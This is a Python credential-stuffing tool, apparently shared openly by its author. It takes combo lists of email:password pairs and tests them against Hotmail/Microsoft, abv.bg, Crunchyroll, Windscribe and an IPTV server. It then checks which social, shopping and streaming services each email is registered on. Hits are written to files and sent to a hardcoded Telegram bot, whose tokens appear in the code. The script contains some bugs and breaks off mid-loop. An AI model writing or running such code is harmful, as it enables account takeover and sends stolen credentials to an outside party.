from lixlib import *
from requests import get
from requests import *
import requests
import uuid
import string
import random
from user_agent import generate_user_agent
from re import *
import telebot
import os, random
import requests, user_agent, json, uuid, re, mechanize
from user_agent import generate_user_agent
from colorama import Fore

# login = 261
#email = 33
token = "7114338863:AAEvjDBx5eYzRHJR4Fcs99PPVy5lfNfJrGw"
ID = "6451727338"

bot = telebot.TeleBot(token)
bott = telebot.TeleBot("7058880196:AAG3oP7a4nHGfdqnmaUCChMHAv66TPg271k")

def save(name, type, acc):
	with open(f"{name}_{type}.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{acc}\n")
	     						    f.close()





#///////////////////email\\\\\\\\\\\\\\\\#
#///////////////////email\\\\\\\\\\\\\\\\#
#///////////////////email\\\\\\\\\\\\\\\\#
#///////////////////email\\\\\\\\\\\\\\\\#
#///////////////////email\\\\\\\\\\\\\\\\#
#///////////////////email\\\\\\\\\\\\\\\\#
#///////////////////email\\\\\\\\\\\\\\\\#
def em_spotify(em):
 email = em
 response = get('https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email='+email).text
 if "Ese correo electrónico ya está registrado en una cuenta." in response or "That email is already registered to an account" in response or "Cette adresse e-mail est déjà associée à un compte" in response: return "✅"
 else: return False

def em_tik(email):

	url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
	data = f"email={email}&aid=1459&language=en&account_sdk_source=web&region=SA"
	hed = {
		"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
	}
	r = requests.post(url,headers=hed,data=data)
	if '{"is_registered":1}' in r.text:
		return "✅"
	elif '{"is_registered":0}' in r.text:
		return False
	else:
		return None


def em_face(email):
	do= email
	url = "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover"
	headers = {
	
	'Accept-Encoding': 'gzip, deflate',

	 'Accept-Language': 'ar,en;q=0.9',

	 'Content-Length': '449',

	 'Content-Type': 'application/x-www-form-urlencoded',

	 'Cookie': 'sb=Oo8HZZZ6vnqEZ6ynkus2jxPI; datr=Oo8HZc6DfgQqQ8BRfXyVyGd8; wd=819x786; fr=0FyWo0d5GPyuYrjZC..BlB486.JC.AAA.0.0.BlU--d.AWXgcAsd610; dpr=1.25',

	 'Dnt': '1',

	 'Dpr': '1.25',

	 'Origin': 'https://www.facebook.com',

	 'Referer': 'https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0',

	 'Sec-Ch-Prefers-Color-Scheme': 'light',

	 'Sec-Ch-Ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',

	 'Sec-Ch-Ua-Full-Version-List': '"Google Chrome";v="119.0.6045.124", "Chromium";v="119.0.6045.124", "Not?A_Brand";v="24.0.0.0"',

	 'Sec-Ch-Ua-Mobile': '?0',

	 'Sec-Ch-Ua-Model': '""',

	 'Sec-Ch-Ua-Platform': '"Windows"',

	 'Sec-Ch-Ua-Platform-Version': '"10.0.0"',

	 'Sec-Fetch-Dest': 'empty',

	 'Sec-Fetch-Mode': 'cors',

	 'Sec-Fetch-Site': 'same-origin',

	 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',

	 'Viewport-Width': '819',

	 'X-Asbd-Id': '129477',

	 'X-Fb-Lsd': 'AVqcuDYfE3M',
	}
	
	data = {

	 'jazoest': '2936',

	 'lsd': 'AVqcuDYfE3M',

	 'email': f'{do}',

	 'did_submit': '1',

	 '__user': '0',

	 '__a': '1',

	 '__req': '4',

	 '__hs': '19675.BP:DEFAULT.2.0..0.0',

	 'dpr': '1.5',

	 '__ccg': 'GOOD',

	 '__rev': '1009892822',

	 '__s': 'k4mpco:hghv49:i1469z',

	 '__hsi': '7301442896614796409',

	 '__dyn': '7xeUmwkHg7ebwKBWo5O12wAxu13wqovzEdEc8uxa0CEbo1nEhwem0nCq1ewcG0KEswIwuo2awt81s8hwnU14E9k2C2218wc60D8vw8O4U2zxe3C0D85a2W2K0zE5W0HUvw4JwJwSyES0gq0Lo6-1FwbO1pwr81rE',

	 '__csr': '',

	 '__spin_r': '1009892822',

	 '__spin_b': 'trunk',

	 '__spin_t': '1699999649',
	}
	r=requests.post(url,headers=headers,data=data).text
	if "domops" in r:
		return False
	else:
		return "✅"

def em_insta(email):
        head2 = {
        "user-agent": f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; en_GB;)"}
        data = {
        "user_email": email,
        "guid": uuid.uuid4(),
        "device_id": uuid.uuid4()}
        req = requests.post("https://i.instagram.com/api/v1/accounts/send_password_reset/", headers=head2, data=data)
        
        if 'Please wait a few minutes before you try again.' in req.text:
  	     		return "maybe"
        elif 'obfuscated_email' in req.text:
  	     		return "✅"
        else:
  	     		return False


def em_ntflix(email):
	r=requests.Session()
	ema =str(email)
	password = "aaggguehshu66A$"
	email = ema.split("@")[0]
	domn = ema.split("@")[1]
	url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'
	headers = {
	"Host": "ios.prod.http1.netflix.com",
	"Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTg3NDMzQzUyQzZGQjRCNjczRTg1NjIxRUEzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TvuMtezrkns7ZtQcfAcFOutfzGV9LhYM1QKbizWrz0uHkFoHMVbhNYl",
	"Content-Type": "application/x-www-form-urlencoded",
	"X-Netflix.argo.abtests": "",
	"X-Netflix.client.appversion": "10.19.0",
	"Accept": "*/*",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "ar-US;q=1, en-US;q=0.9",
	"Content-Length": "1851",
	"X-Netflix.client.idiom": "phone",
	"User-Agent": generate_user_agent(),
	"X-Netflix.client.type": "argo",
	"X-Netflix.nfnsm": "9",
	"Connection": "close"
	}
	data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22interactiveFeatureAlexaAndKatieCharacterEnabled%22%3A%229.57.0%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22bigRowEnabled%22%3A%22true%22%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3D4-D5BA7B1A025245368D4AA323E987433C52C6FB4B673E85621EA301D444EC78B1&idiom=phone&iosVersion=14.3&isTablet=false&kids=false&maxDeviceWidth=414&method=call&model=saget&modelType=IPHONE9-4&odpAware=true&param=%7B%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22email%22%3A%22{email}%40{domn}%22%2C%22rememberMe%22%3A%22true%22%2C%22password%22%3A%22{password}%22%7D%2C%22verb%22%3A%22POST%22%2C%22mode%22%3A%22login%22%2C%22flow%22%3A%22appleSignUp%22%7D&pathFormat=graph&pixelDensity=3.0&progressive=false&responseFormat=json'
	Go = r.post(url, headers=headers, data=data, proxies=None)
	if '"memberHome"' in Go.text:
		return "✅"
	elif '"incorrect_password"' in Go.text:
		return "✅"
	elif 'never_member_consumption_only' in Go.text:
		return "maybe"
	elif 'unrecognized_email' in Go.text:
		return False
	else:
		return "blocked"

def twiter(email: str) -> str:
        
        v = 'https://twitter.com/i/flow/password_reset?input_flow_data=%7B%22requested_variant%22%3A%22eyJwbGF0Zm9ybSI6IlJ3ZWIifQ%3D%3D%22%7D'
        head = {'user-agent': str(generate_user_agent())}
        req = requests.post(v, headers=head).cookies.get_dict()
        per = req['personalization_id']
        g_id = req['guest_id_marketing']
        g_ads = req['guest_id_ads']
        g_i = req['guest_id']
        url = f"https://twitter.com/i/api/i/users/email_available.json?email={email}"
        headers = {'accept': '*/*',
                   'accept-encoding': 'gzip, deflate, br',
                   'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                   'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                   'cookie': f'personalization_id={per}; guest_id_marketing={g_id}; guest_id_ads={g_ads}; guest_id={g_i}; ct0=49382582f7d8154eae4e5a0b51265894; _sl=1; gt=1542877580168249344; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCEkAKbqBAToMY3NyZl9p%250AZCIlMWI5MDZhMjgzYjJhY2JhNjIzZjUzNGQyNmE0MmI4NDU6B2lkIiVhOGNj%250AM2JiNGFhMjZlYjdhYjI2ZGQ1YmE4ZDZiZDBiZg%253D%253D--9eb344c9082b904ac770ed1170465202fad6cb18; att=1-AkCxZlbAOfhccMy18SL99HQSEWsxiWxOhcek7sAY; _ga=GA1.2.1018461544.1656685665; _gid=GA1.2.879109925.1656685665',
                   'referer': 'https://twitter.com/i/flow/signup',
                   'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                   'sec-ch-ua-mobile': '?0',
                   'sec-ch-ua-platform': '"Windows"',
                   'sec-fetch-dest': 'empty',
                   'sec-fetch-mode': 'cors',
                   'sec-fetch-site': 'same-origin',
                   'user-agent': str(generate_user_agent()),
                   'x-csrf-token': '49382582f7d8154eae4e5a0b51265894',
                   'x-guest-token': '1542877580168249344',
                   'x-twitter-active-user': 'yes',
                   'x-twitter-client-language': 'en', }
        data = {'email': str(email)}
        res = requests.get(url, headers=headers, data=data).json()
        if res['taken'] == True:
            return "✅"

        else:
            return False
 
 
def em_amazon(email):
	mail = email
	link = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"

	head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}

	s = requests.session()

	g = s.get(link, headers=head)
	xxx = {'customerName':'Casein Nitrate','email': mail,'password':'BirdyBirdySad012','passwordCheck':'BirdyBirdySad012'}

	cek = s.post(link, headers=head, data=xxx).text 
	if "You indicated you're a new customer, but an account already exists with the email address" in cek:
		return "✅"
	else:
		return False
#///////////////////login\\\\\\\\\\\\\\\\#
#///////////////////login\\\\\\\\\\\\\\\\#
#///////////////////login\\\\\\\\\\\\\\\\#
#///////////////////login\\\\\\\\\\\\\\\\#

def log_iptv(acc):
	server = "http://zyniptv.com:8080" # server url
	email=acc.split(':')[0]
	psw=acc.split(':')[1]
	req = post(f"{server}/player_api.php?username={email}&password={psw}")
	if "Welcome to Apple IPTV" in req.text and "Active" in req.text:
		return True
	elif "Welcome to Apple IPTV" in req.text and "Not Active" in req.text:
		return "not active"
	else:
		return False

def log_cruch(acc):
        					try:
        						
        						user=acc.split(':')[0]
        						pasn=acc.split(':')[1]
        						login_url = 'https://beta-api.crunchyroll.com/auth/v1/token'
        						login_payload = f'username={user}&password={pasn}&grant_type=password&scope=offline_access'
        						login_header = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
    'User-Agent': 'Crunchyroll/4.1.0 (bundle_identifier:com.crunchyroll.iphone; build_number:1660985.483065922) iOS/13.7.0 Gravity/3.0.0',
    'Authorization': 'Basic Y3JfaW9zOmI4MjQzZDQwLWFmYmEtNDkxYi05NzMxLTZmMTdlMTcyMTk3Mw=='
        						}
        						login_post = requests.post(login_url, data = login_payload, headers = login_header)
        						lpt = login_post.text
        						if 'access_token":"' in lpt:
        							return True
        						elif 'invalid_credentials' in lpt:
        							return False
        					except:
        						return "banned{you}"

def log_windscribe(acc):
	username, password = account.split(':')
	k = post("https://api.windscribe.com/Session?platform=chrome", data={"username": username,"password": password,"time": int(time()),"client_auth_hash": md5(f"952b4412f002315aa50751032fcaab03{str(int(time()))}".encode()).hexdigest(),"session_type_id": 2}).text
	if "session_auth_hash" in k:
		return True
	else:
		return False
def hotm(acc):
	account = acc
	username , password = account.split(':')
	try:
		post("https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216", headers={"Content-Type": "application/x-www-form-urlencoded","Cookie": "MSPRequ=id=N<=1665024852&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; RefreshTokenSso=DXCaJOtPG*BlXEHzcgRDqE07fauJ1A1kX*6XyoYoJYnh6VaFpWKvnDU9a9gcpqoNxNdQgHNS9VZG*5hmg2erN27L10IP*WsWKKpLigD53vPiogiSPdJAr3O0gjmfcQfz6f0OyEg2aZZgntPFoQQGsNQ$; OParams=11O.DXVHPEaTdwhBRrUxAksZtejMR5GXGxhF6!8Hxy8VRkYjMiABstaKcULDTzLksggYZ*hhf7tHkwgO5naj*qAriJtE0iCytvLQOAYM8kgF3ZvgwPzvuOREtprcqZE3clxF*EV1kmT9zz0f8355KdPZeV1sU9kTsgn5aO3oY2JP0HGtOpXdP9dHvqAI6qhewBM5DlIdsRpSXS6fyCe6mbG7DjUIZ1BEd!7AUDxP48LC1RMYjnDvhBzq!on5FTEhBRqKYt9j0dDLn2GJGswk!wN*njZSNtxGZBhwJJ9fVfGpciT2amDnxk!l3tNqvC*hfp6PTe2S4oxFSN!4eI6A4c!xO79Zs0AY0GSqe4aTBT8YdIECZAE9NBa67FlVvcRXyIi0mzLYBVqtEFTYsyYjTSnLhcMlnpbcH3Yv5gVCFQEgmfkrEAt4Ks5cyBTD7XWqBCsCJQ$$; MSPOK=$uuid-d7ee354f-b458-46dc-9b33-6f8663109932; wlidperf=FR=L&ST=1665024898546"}, data="i13=1&login="+username+"&loginfmt="+username+"&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd="+password+"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DUVD66h%21%214HoXIbKjn000ZGJKO1p18njhrsHcoKRvak5LHBzMd1JFGEphEtdX70prBYfw9DpxPUypooZTmCCZq8nG7plPwo2mQBvuJr2QzynRopNlcY0Kndww9DNP7xTtP9E6nbJTkUE2zT*R6kFw7uu06RWq4BjG8Wo792ObNHtJAwxS2NfDxrccipqE%212zXAFqhBFcyCNidOqtBqnqKUE%24&PPSX=Passp&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=41679").cookies['PPLState']
		return True
	except:
		return False

def hotm1(acc):
    account = acc
    email , password = account.split(':')
    
    cookies = {
        'wlidperf': 'FR=L&ST=1573475967016',
        'MSPShared': '1',
        'SDIDC': 'CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$',
        'IgnoreCAW': '1',
        'MSCC': '1571654982',
        'mkt': 'en-US',
        'optimizelyEndUserId': 'oeu1572238927711r0.5850160263416339',
        'uaid': 'e94a49f177664960a3fca122edaf8a27',
        'MSPRequ': 'id=292543&lt=1573475927&co=1',
        'OParams': '11DUe2VlF3OgbQNYrRZRg3REn8KImGd*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh',
        'MSPOK': '$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Origin': 'https://login.live.com',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099 '

    response = requests.post(
        'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0',
        cookies=cookies,
        headers=headers,
        data=data).text
    
    if "incorrect account or password.\"" in response:
            return False
    elif ",AC:null,urlFedConvertRename" in response:
            return "bannd"
    elif "timed out" in response:
            return False
    elif "<COOKIES{*}>" in response and ("PPAuth" in response or "WLSSC" in response):
            return "hit2"
    elif 'name="ANON"' in response or 'sSigninName' in response:
            return "hit1"
            
    elif any(keyword in response for keyword in ["account.live.com/recover?mkt", "recover?mkt", "account.live.com/identity/confirm?mkt", "https://account.live.com/profile/accrue?mkt="]):
            return "2fa-2"
            
    elif "Email/Confirm?mkt" in response:
            return "2fa-1"
    elif "/cancel?mkt=" in response:
            return "Custom2"
            
    elif "/Abuse?mkt=" in response:
            return "Custom1"
    else:
            return None
            
def abv(acc):
	account = acc
	email, password = account.split(':')
	response = post("https://passport.abv.bg/app/profiles/login",data={"service": "mobile20", "username": email, "password": password, "submit_button": "вход"}).text
	if "Refresh" in response:
		return True
	else:
		return False

def main1():
	s = int(input(""" welcome to my tool \n\n tik : __fl | tele: pppiqi

1- email domain {abv.bg} - {Hotmail}
- insta
- tik
- face
- amazon
- netflix
- spotify

enter 1- hotmail
      2- abv.bg :"""))
	path=input(f'[+] Combo List Path : ')
	hit_false = 0
	hit_True = 0
	all = 0
	if s == int("1"):
	     		print("start .......")
	     		while True:
	     			for whis in open(path,'r').read().splitlines():
	     				acc=str(whis)
	     				acc=acc.split('\n')[0]
	     				email=acc.split(':')[0]
	     				psw=acc.split(':')[1]
	     				account = email + ":" + psw
	     				dom = hotm1(account)
	     				if dom == False or dom == None:
	     					print(f"- {Fore.RED}{account}")
	     				elif dom == "2fa-2" or dom == "2fa-1":
	     					tik = em_tik(email)
	     					insta = em_insta(email)
	     					face = em_face(email)
	     					twiter = twiter(email)
	     					amzon = em_amazon(email)
	     					spotify = em_spotify(email)
	     					netflix = em_ntflix
	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte"""
	     					if tik == "✅":
	     						save("tik", "2fa-hotm", account)
	     						save("all", "2fa-hotm", mes)
	     						ttok = "{ tik "
	     					else:
	     						ttok = "{"
	     						pass
	     						
	     					if insta == "✅":
	     						save("insta", "2fa-hotm", account)
	     						save("all", "2fa-hotm", mes)
	     						t1ok = "| insta "
	     					else:
	     						t1ok = ""
	     						pass
	     					
	     					if face == "✅":
	     						save("face", "2fa-hotm", account)
	     						save("all", "2fa-hotm", mes)
	     						t2ok = "| face "
	     					else:
	     						t2ok = ""
	     						pass
	     					
	     					if twiter == "✅":
	     						save("twitter", "2fa-hotm", account)
	     						save("all", "2fa-hotm", mes)
	     						t3ok = "| twitter "
	     					else:
	     						t3ok = ""
	     						pass
	     						
	     					if amzon == "✅":
	     						save("amzon", "2fa-hotm", account)
	     						save("all", "2fa-hotm", mes)
	     						
	     						t4ok = "| amzon "
	     					else:
	     						t4ok = ""
	     						pass
	     					
	     					if spotify == "✅":
	     						save("spotify", "2fa-hotm", account)
	     						save("all", "2fa-hotm", mes)
	     						t5ok = "| spotify "
	     					else:
	     						t5ok = ""
	     						pass
	     					
	     					if netflix == "✅":
	     						save("netflix", "2fa-hotm", account)
	     						save("all", "2fa-hotm", mes)
	     						
	     						t6ok = "| netflix "
	     					else:
	     						t6ok = "}"
	     						pass
	     					
	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte""")
	     					print(f"{Fore.YELLOW}{account}")
	     					
	     				if dom == "hit1" or dom == "hit2":
	     					tik = em_tik(email)
	     					insta = em_insta(email)
	     					face = em_face(email)
	     					twiter = twiter(email)
	     					amzon = em_amazon(email)
	     					spotify = em_spotify(email)
	     					netflix = em_ntflix
	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte"""
	     					if tik == "✅":
	     						save("tik", "hit-hotm", account)
	     						save("all", "hit-hotm", mes)
	     						ttok = "{ tik "
	     					else:
	     						ttok = "{"
	     						pass
	     						
	     					if insta == "✅":
	     						save("insta", "hit-hotm", account)
	     						save("all", "hit-hotm", mes)
	     						t1ok = "| insta "
	     					else:
	     						t1ok = ""
	     						pass
	     					
	     					if face == "✅":
	     						save("face", "hit-hotm", account)
	     						save("all", "hit-hotm", mes)
	     						t2ok = "| face "
	     					else:
	     						t2ok = ""
	     						pass
	     					
	     					if twiter == "✅":
	     						save("twitter", "hit-hotm", account)
	     						save("all", "hit-hotm", mes)
	     						t3ok = "| twitter "
	     					else:
	     						t3ok = ""
	     						pass
	     						
	     					if amzon == "✅":
	     						save("amzon", "hit-hotm", account)
	     						save("all", "hit-hotm", mes)
	     						t4ok = "| amzon "
	     					else:
	     						t4ok = ""
	     						pass
	     					
	     					if spotify == "✅":
	     						save("spotify", "hit-hotm", account)
	     						save("all", "hit-hotm", mes)
	     						t5ok = "| spotify "
	     					else:
	     						t5ok = ""
	     						pass
	     					
	     					if netflix == "✅":
	     						save("netflix", "hit-hotm", account)
	     						save("all", "hit-hotm", mes)
	     						t6ok = "| netflix "
	     					else:
	     						t6ok = "}"
	     						pass
	     					
	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte""")
	     					print(f"{Fore.GREEN}{account}")
	     				else:
	     					
	     					tik = em_tik(email)
	     					insta = em_insta(email)
	     					face = em_face(email)
	     					twiter = twiter(email)
	     					amzon = em_amazon(email)
	     					spotify = em_spotify(email)
	     					netflix = em_ntflix
	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte"""
	     					
